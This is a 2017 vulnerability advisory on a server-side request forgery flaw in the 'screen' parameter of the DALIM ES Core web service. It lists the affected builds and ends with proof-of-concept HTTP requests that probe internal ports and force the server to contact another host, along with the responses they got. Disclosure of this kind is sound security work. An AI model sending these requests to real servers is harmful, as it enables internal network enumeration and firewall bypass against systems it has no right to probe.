@@ -1,0 +1,130 @@
+DALIM SOFTWARE ES Core 5.0 build 7184.1 Server-Side Request Forgery
+
+
+Vendor: Dalim Software GmbH
+Product web page: https://www.dalim.com
+Affected version: ES/ESPRiT 5.0 (build 7184.1)
+                                (build 7163.2)
+                                (build 7163.0)
+                                (build 7135.0)
+                                (build 7114.1)
+                                (build 7114.0)
+                                (build 7093.1)
+                                (build 7093.0)
+                                (build 7072.0)
+                                (build 7051.3)
+                                (build 7051.1)
+                                (build 7030.0)
+                                (build 7009.0)
+                                (build 6347.0)
+                                (build 6326.0)
+                                (build 6305.1)
+                                (build 6235.9)
+                                (build 6172.1)
+                  ES/ESPRiT 4.5 (build 6326.0)
+                                (build 6144.2)
+                                (build 5180.2)
+                                (build 5096.0)
+                                (build 4314.3)
+                                (build 4314.0)
+                                (build 4146.4)
+                                (build 3308.3)
+                  ES/ESPRiT 4.0 (build 4202.0)
+                                (build 4132.1)
+                                (build 2235.0)
+                  ES/ESPRiT 3.0
+
+Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built
+from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES
+Core is the engine that can handle project tracking, JDF device workflow,
+dynamic user interface building, volume management. Each ES installation
+will have different features, depending on the license installed: online
+approval, prepress workflow, project tracking, imposition management...
+
+ES is a collaborative digital asset production and management platform,
+offering services ranging from online approval to web-based production
+environment for all participants of the production cycle, including brand
+owners, agencies, publishers, pre-media, printers and multichannel service
+provider. ES lets users plan, execute and control any aspect of media
+production, regardless of the final use of the output (print, web, ebook,
+movie, and others). It ensures productivity and longterm profitability.
+
+
+Desc: A server-side request forgery (SSRF) vulnerability exists in the
+DALIM Web Service management interface within the XUI servlet functionality.
+The DALIM web services are a set of tools used by the different DALIM SOFTWARE
+applications: TWIST, MISTRAL and ES. It provides file sharing capabilities,
+JDF devices, JDF controller, and job spooling management. The application
+parses user supplied data in the GET parameter 'screen' to construct a page
+request to the service. Since no validation is carried out on the parameter,
+an attacker can specify an external domain and force the application to make
+a HTTP request to an arbitrary destination host. This can be used by an external
+attacker for example to bypass firewalls and initiate a service and network
+enumeration on the internal network through the affected application.
+
+Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)
+           CentOS 7
+           Apache Tomcat/7.0.78
+           Apache Tomcat/7.0.67
+           Apache Tomcat/7.0.42
+           Apache Tomcat/6.0.35
+           Apache-Coyote/1.1
+           Java/1.7.0_80
+           Java/1.6.0_21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5428
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5428.php
+
+
+15.06.2017
+
+--
+
+
+1. Check for open port:
+-----------------------
+
+GET /dalimws/xui?screen=http://127.0.0.1:8888 HTTP/1.1
+Host: 192.168.1.2:8080
+Accept: */*
+Accept-Language: en
+Connection: close
+
+<Error message="java.net.ConnectException: Connection refused org.w3c.dom.DOMException: java.net.ConnectException: Connection refused&#10;&#9;at
+
+
+2. Check for open port:
+-----------------------
+
+GET /dalimws/xui?screen=http://127.0.0.1:8080 HTTP/1.1
+Host: 192.168.1.2:8080
+Accept: */*
+Accept-Language: en
+Connection: close
+
+<Error message="org.xml.sax.SAXParseException: The reference to entity "ctype" must end with the ';' delimiter. org.w3c.dom.DOMException: org.xml.sax.SAXParseException: The
+
+
+3. Observe server-side request:
+-------------------------------
+
+GET /dalimws/xui?screen=http://192.168.1.55 HTTP/1.1
+Host: 192.168.1.2:8080
+Accept-Language: en-US,en;q=0.8,mk;q=0.6
+Connection: close
+
+
+Request from 192.168.1.2 to 192.168.1.55 observed:
+
+GET / HTTP/1.1
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: SSRF/Test_1.4
+Host: 192.168.1.55
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
